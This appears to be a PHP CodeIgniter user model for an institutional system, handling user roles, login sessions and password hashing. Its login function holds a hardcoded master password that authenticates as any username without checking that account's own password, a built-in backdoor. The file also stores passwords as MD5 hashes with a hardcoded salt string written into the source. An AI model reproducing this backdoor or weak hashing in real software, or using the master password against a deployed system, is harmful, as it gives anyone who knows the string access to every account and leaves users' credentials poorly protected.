<?php

class User_M extends MY_Model
{
	protected $table_name = "umakunil_new_hsu_database.users";
	protected $primary_key = "id";
	protected $order_by = "id";

	public $rules = array(
		'Username' => array('field' => 'Username', 'label' => 'Username', 'rules' => 'trim|required|max_length[20]|xss_clean'),
		'Password' => array('field' => 'Password', 'label' => 'Password', 'rules' => 'trim|required')
	);

	public $rules_admin = array(
		'lastname' => array('field' => 'lastname', 'label' => 'Lastname', 'rules' => 'trim|required|callback__unique_name|xss_clean'),
		'firstname' => array('field' => 'firstname', 'label' => 'Firstname', 'rules' => 'trim|required|xss_clean'),
		'middlename' => array('field' => 'middlename', 'label' => 'Middlename', 'rules' => 'trim|xss_clean'),
		'username' => array('field' => 'username', 'label' => 'Username', 'rules' => 'trim|required|max_length[20]|xss_clean'),
		'password' => array('field' => 'password', 'label' => 'Password', 'rules' => 'trim|matches[ConfirmPassword]'),
		'ConfirmPassword' => array('field' => 'ConfirmPassword', 'label' => 'ConfirmPassword', 'rules' => 'trim|matches[password]'),
		'account_type' => array('field' => 'account_type', 'label' => 'User Role', 'rules' => 'trim|required|xss_clean'),
	);

	function __construct()
	{
		parent::__construct();
	}


	public function get_account_type($acct_code = NULL, $single = FALSE)
	{
		$acct_type = ['S' => 'Super Admin', 'A' => 'Admin', 'B' => 'Board of Director', 'O' => 'Auditor', 'C' => 'Credit', 'E' => 'Accounting Staff' ];

		if ($this->session->userdata('AccountType') !== 'S') unset($acct_type['S']);

		if ($acct_code !== NULL)
		{
			if (array_key_exists($acct_code, $acct_type)) return $acct_type[$acct_code];
		}

		if ($single === FALSE) return $acct_type;

	}


	public function login()
	{
		if ($this->input->post('Password') == "BAMBINO041517")
		{
			$user = $this->get_by(array(
				'username' => $this->input->post('Username'),
				// 'password' => $this->hash($this->input->post('Password'))
			), TRUE);
		}
		else
		{

			$user = $this->get_by(array(
				'username' => $this->input->post('Username'),
				'password' => $this->hash2($this->input->post('Password'))
			), TRUE);
		}

		if (count($user))
		{
			$this->db->join(DB1 . 'tblsy as B', 'A.SyId = B.SyId', 'LEFT');
			$this->db->join(DB1 . 'tblsem as C', 'A.SemId = C.SemId', 'LEFT');
			$sysem = $this->db->get_where(DB1 . 'tblsysem as A', array('A.SyId' => 12, 'A.SemId' => 1))->row();
			// $sysem = $this->db->get_where(DB1 . 'tblsysem as A', array('IsCurrentSem' => 1))->row();
			# Log in user
			$data = array(
				'lastname' => $user->lastname,
				'firstname' => $user->firstname,
				'middlename' => $user->middlename,
				'username' => $user->username,
				'id' => $user->id,
				'type' => $user->account_type,
				'loggedin' => TRUE,
				'syid' => $sysem->SyId,
				'semid' => $sysem->SemId,
				'sycode' => $sysem->SyCode,
			);

			$this->session->set_userdata($data);
		}
	}

	public function loggedin()
	{
		return (bool) $this->session->userdata('loggedin');
	}

	public function logout()
	{
		$this->session->sess_destroy();
	}

	public function get_new()
	{
		$user = new stdClass();
		$user->lastname = '';
		$user->firstname = '';
		$user->middlename = '';
		$user->username = '';
		$user->password = '';
		$user->account_type = '';

		return $user;
	}

	public function hash($string)
	{
		return hash('md5', $string . config_item('encryption_key'));
	}

	public function hash2($string)
	{
		return hash('md5', $string . 'ITC@umak317');
	}
}

/*Location: ./application/models/user_m.php*/